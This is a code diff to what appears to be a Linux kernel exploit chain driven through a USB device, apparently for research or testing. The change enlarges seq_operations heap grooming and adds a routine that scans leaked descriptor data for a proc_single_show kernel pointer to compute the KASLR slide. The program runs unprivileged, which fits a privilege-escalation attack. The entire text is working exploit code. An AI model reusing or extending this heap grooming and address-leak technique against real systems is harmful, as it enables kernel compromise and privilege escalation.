@@ -18,12 +18,14 @@
 #define KAPO_NEXT_STAGE _IO('K', 2)
 #define PIPE_COUNT 768
 #define HELPER_GROOM_PIPE_COUNT 400
-#define SEQ_GROOM_COUNT 256
+#define SEQ_GROOM_COUNT 512
+#define SEQ_FREE_COUNT 128
 #define PAGE_SIZE 4096
 #define DEVICE_DESCRIPTOR_SIZE 18
 #define SEQ_CONFIG_LENGTH 32
 #define PIPE_CONFIG_LENGTH 1024
 #define HELPER_CONFIG_COUNT 8
+#define SEQ_CONFIG_COUNT 8
 #define SEQ_LEAK_OFFSET 0x19
 #define HELPER_PAGE_LEAK_OFFSET 0x50
 #define TARGET_STRUCT_PAGE_SIZE 64
@@ -157,6 +159,24 @@ static uint64_t read_proc_leak(const char *path, off_t offset,
 	return le64toh(value);
 }
 
+static uint64_t find_proc_runtime(const char *path, uint64_t proc_static,
+				  int config_count)
+{
+	int config;
+
+	for (config = 0; config < config_count; config++) {
+		uint64_t runtime = read_proc_leak(path,
+			DEVICE_DESCRIPTOR_SIZE + config * SEQ_CONFIG_LENGTH +
+			SEQ_LEAK_OFFSET, proc_static);
+		uint64_t slide = runtime - proc_static;
+
+		if ((runtime >> 32) == 0xffffffff && runtime >= proc_static &&
+		    slide < KERNEL_IMAGE_SIZE && !(slide & (KASLR_ALIGNMENT - 1)))
+			return runtime;
+	}
+	return 0;
+}
+
 static void print_pointer_candidates(const char *path)
 {
 	uint8_t descriptors[DEVICE_DESCRIPTOR_SIZE + PIPE_CONFIG_LENGTH];
@@ -183,17 +203,27 @@ static void print_pointer_candidates(const char *path)
 	}
 }
 
-static void signal_ready(const char *stage)
+static int open_ready(void)
 {
 	static const char path[] = "/tmp/kapo-usb-ready";
 	int fd = open(path, O_WRONLY);
 
 	if (fd < 0)
 		fail("open readiness signal");
+	return fd;
+}
+
+static void signal_ready_fd(int fd, const char *stage)
+{
 	if (dprintf(fd, "%s\n", stage) < 0)
 		fail("write readiness signal");
 	if (close(fd))
 		fail("close readiness signal");
+}
+
+static void signal_ready(const char *stage)
+{
+	signal_ready_fd(open_ready(), stage);
 }
 
 static int open_device(const char *path);
@@ -244,7 +274,8 @@ static void groom_seq_operations(void)
 		if (files[index] < 0)
 			fail("seq_operations grooming");
 	}
-	for (index = 0; index < SEQ_GROOM_COUNT; index++)
+	for (index = SEQ_GROOM_COUNT - SEQ_FREE_COUNT;
+	     index < SEQ_GROOM_COUNT; index++)
 		close(files[index]);
 }
 
@@ -342,6 +373,8 @@ int main(int argc, char **argv)
 	struct rlimit limit;
 	int pipes[PIPE_COUNT][2];
 	int device_fd;
+	int ready_fd = -1;
+	int seq_config_count;
 	int result;
 	int hardware_mode = 0;
 
@@ -369,6 +402,7 @@ int main(int argc, char **argv)
 		if (setgid(65534) || setuid(65534))
 			fail("drop privileges");
 	}
+	seq_config_count = hardware_mode ? 1 : SEQ_CONFIG_COUNT;
 	if (!geteuid()) {
 		fprintf(stderr, "full-chain test must run unprivileged\n");
 		return EXIT_FAILURE;
@@ -407,14 +441,15 @@ int main(int argc, char **argv)
 	}
 	advance_firmware(device);
 	wait_for_descriptor(descriptors, 0, 0);
+	if (!hardware_mode)
+		ready_fd = open_ready();
 	groom_seq_operations();
 	if (!hardware_mode)
-		signal_ready("seq");
+		signal_ready_fd(ready_fd, "seq");
 	wait_for_descriptor(descriptors,
-			    DEVICE_DESCRIPTOR_SIZE + SEQ_CONFIG_LENGTH, 1);
-	seq_leak = read_proc_leak(descriptors,
-				  DEVICE_DESCRIPTOR_SIZE + SEQ_LEAK_OFFSET,
-				  proc_static);
+			    DEVICE_DESCRIPTOR_SIZE +
+			    seq_config_count * SEQ_CONFIG_LENGTH, 1);
+	seq_leak = find_proc_runtime(descriptors, proc_static, seq_config_count);
 	proc_runtime = seq_leak;
 	if ((proc_runtime >> 32) != 0xffffffff || proc_runtime < proc_static) {
 		fprintf(stderr, "invalid proc_single_show leak: %#llx\n",
